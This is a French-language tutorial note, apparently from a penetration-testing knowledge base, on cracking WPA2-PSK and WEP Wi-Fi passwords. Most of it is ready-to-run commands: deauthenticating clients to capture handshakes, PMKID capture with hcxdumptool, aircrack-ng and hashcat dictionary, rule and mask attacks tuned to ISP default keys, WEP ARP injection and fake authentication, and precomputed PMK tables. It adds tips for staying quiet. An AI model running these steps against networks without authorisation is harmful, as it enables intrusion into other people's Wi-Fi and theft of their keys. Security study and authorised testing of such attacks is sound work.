---
title: "Attaques WPA2-PSK"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, wpa2, pmkid, hashcat, aircrack]
date: "2026-05-17"
---

# Attaques WPA2-PSK

Le mode WPA2-Personal utilise une PSK (Pre-Shared Key) commune. Le craquage est **toujours offline** : on capture une preuve cryptographique, puis on brute-force le mot de passe sans plus toucher au réseau.

## Le handshake 4-way en bref

```
Client (STA)                           AP
   |                                    |
   | <-------- 1. ANonce -------------- |
   |                                    |
   | --- 2. SNonce + MIC ------------>  |
   |                                    |
   | <-- 3. GTK + MIC ----------------- |
   |                                    |
   | --- 4. ACK --------------------->  |
```

La PTK (Pairwise Transient Key) dérive de :
```
PTK = PRF(PMK, ANonce || SNonce || AP_MAC || STA_MAC)
PMK = PBKDF2(PSK, SSID, 4096, 256)
```

Avec les 4 messages capturés + ESSID + MACs, on peut **vérifier offline** si une PSK candidate produit le bon MIC.

## Capture du handshake

```bash
# 1. Repérer la cible et fixer le canal
airodump-ng wlan0mon                          # noter BSSID + CH

# 2. Lancer la capture ciblée
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w handshake wlan0mon
# → handshake-01.cap
# → en haut à droite : "WPA handshake: AA:BB:CC:DD:EE:FF" quand capturé

# 3. Forcer la capture via deauth (terminal séparé)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -a = AP, -c = client précis, 5 = nb de paquets deauth
# Sans -c → broadcast (moins efficace, certains clients ignorent)

# 4. Vérifier la qualité de la capture
aircrack-ng handshake-01.cap                  # "1 handshake" attendu

# Outil dédié plus fiable :
hcxpcapngtool handshake-01.cap -o hash.hc22000
# Échec ici = handshake incomplet, recapturer
```

**Astuce** : utiliser `--deauth 3` (pas 100) — un seul paquet suffit souvent et fait moins de bruit.

## PMKID Attack — sans client

Si l'AP est mal configuré (Wi-Fi simple, hotspot perso), il envoie le **PMKID** dans le premier message du handshake, **sans attendre qu'un client se connecte**.

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)
```

```bash
# Capture orientée PMKID
hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1

# Variante filtrée sur une cible précise
hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1 \
  --filterlist_ap=target.txt --filtermode=2
# target.txt contient le BSSID au format aabbccddeeff

# Extraction
hcxpcapngtool capture.pcapng -o pmkid.hc22000 \
  --all                                # PMKID + EAPOL

# Crack
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

**Avantage** : pas besoin d'attendre ou de deauth (silencieux, plus rapide).
**Limite** : ne fonctionne pas si l'AP/802.11r est correctement configuré (PMKID absent ou aléatoire).

## Cracking — aircrack-ng

Rapide pour les petits dictionnaires, **CPU only**.

```bash
# Crack basique
aircrack-ng handshake-01.cap -w rockyou.txt

# Avec un ESSID précis (si capture multi-réseaux)
aircrack-ng handshake-01.cap -e "MonReseau" -w rockyou.txt

# Plusieurs dictionnaires
aircrack-ng handshake-01.cap -w wordlist1.txt,wordlist2.txt
```

## Cracking — hashcat (recommandé, GPU)

Format moderne `.hc22000` (unifié WPA2 handshake + PMKID).

```bash
# Conversion
hcxpcapngtool handshake-01.cap -o hash.hc22000

# Attack mode 0 — dictionnaire pur
hashcat -m 22000 hash.hc22000 rockyou.txt

# Mode 0 + règles (transformations : MotDePasse → motdepasse2024, M0tDeP@sse!)
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/d3ad0ne.rule

# Mode 3 — brute-force masqué (8 chiffres = box opérateur EU souvent)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Masques personnalisés
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?d?d   # Maj+5min+2chif

# Mode 6 — hybride : dictionnaire + masque
hashcat -m 22000 hash.hc22000 -a 6 rockyou.txt ?d?d?d

# Reprendre une session interrompue
hashcat -m 22000 hash.hc22000 rockyou.txt --session=wifi --restore

# Voir le résultat
hashcat -m 22000 hash.hc22000 --show
```

**Wordlists incontournables** :
- `rockyou.txt` (~14 M, mdp leakés 2009)
- `seclists/Passwords/WiFi-WPA/`
- Générées par `crunch` ou `cewl` (depuis un site)

## WEP — historique (5 min)

WEP est **trivialement cassable** (IV de 24 bits réutilisés). Présent uniquement sur du matériel ancien.

```bash
# Capture massive de paquets (avec injection ARP pour accélérer)
airodump-ng -c 6 --bssid BSSID -w wep wlan0mon

# En parallèle : injection ARP (génère beaucoup d'IVs)
aireplay-ng --arpreplay -b BSSID -h MA_MAC wlan0mon

# Fake authentication (si l'AP filtre les sources)
aireplay-ng --fakeauth 0 -a BSSID -h MA_MAC wlan0mon

# Crack quand suffisamment d'IVs (~40 000+)
aircrack-ng wep-01.cap
# → clé révélée en quelques secondes
```

## Optimisations

| Astuce | Gain |
|--------|------|
| GPU récent (RTX 4080, RX 7900) | ~1.5 M H/s sur WPA2 |
| Liste rotée (`rockyou.txt` + `best64.rule`) | x60 candidats |
| Filtrer la wordlist (>= 8 chars, sans non-ASCII) | -30% inutile |
| Hashtopolis (distribué multi-GPU) | linéaire avec le nb de nodes |
| PSK opérateur (box ISP) — masques connus | minutes vs heures |

## Pré-calcul (PMK tables)

```bash
# Générer une rainbow table pour un SSID donné (PMK = PBKDF2(PSK, SSID, ...))
genpmk -f rockyou.txt -d pmk_MonReseau -s MonReseau

# Crack ultra-rapide via cowpatty
cowpatty -d pmk_MonReseau -r handshake-01.cap -s MonReseau
```

Utile si plusieurs handshakes partagent le même SSID (ex : chaîne de boutiques).

## Voir aussi

- [[02 - Reconnaissance et Sniffing]] — capture en amont
- [[04 - Attaques WPS]] — si PSK trop longue, essayer le WPS
- [[09 - WPA3 et Vulnérabilités Modernes]] — SAE résiste aux dictionnaires offline
- [[08 - Frameworks Tout-en-Un]] — airgeddon/wifite2 automatisent ces étapes
